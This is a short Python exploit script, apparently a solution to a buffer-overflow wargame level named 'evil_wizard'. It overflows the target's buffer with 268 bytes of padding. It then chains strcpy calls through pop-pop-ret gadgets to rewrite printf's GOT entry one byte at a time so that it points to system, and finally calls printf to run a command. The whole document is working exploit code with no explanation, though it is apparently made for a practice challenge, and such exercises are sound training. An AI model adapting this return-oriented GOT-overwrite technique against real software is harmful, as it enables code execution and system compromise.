import os
from struct import *
p = lambda x:pack("<L", x)
target = "/home/hell_fire/evil_wizard"

strcpy_plt = 0x08048494
printf_plt = 0x08048424
pop_pop_ret = 0x0804854f
printf_got = 0x08049884
system_got_1 = 0x0804852c # c0
system_got_2 = 0x08048154 # 07
system_got_3 = 0x080486fa # 75
system_got_4 = 0x080483d4 # 00

payload = ""
payload = payload + "A"*268
payload = payload + p(strcpy_plt) + p(pop_pop_ret) + p(printf_got+0) + p(system_got_1)
payload = payload + p(strcpy_plt) + p(pop_pop_ret) + p(printf_got+1) + p(system_got_2)
payload = payload + p(strcpy_plt) + p(pop_pop_ret) + p(printf_got+2) + p(system_got_3)
payload = payload + p(strcpy_plt) + p(pop_pop_ret) + p(printf_got+3) + p(system_got_4)
payload = payload + p(printf_plt) + "AAAA" + "\x03\x36\x83"

os.execv(target, [target, payload])
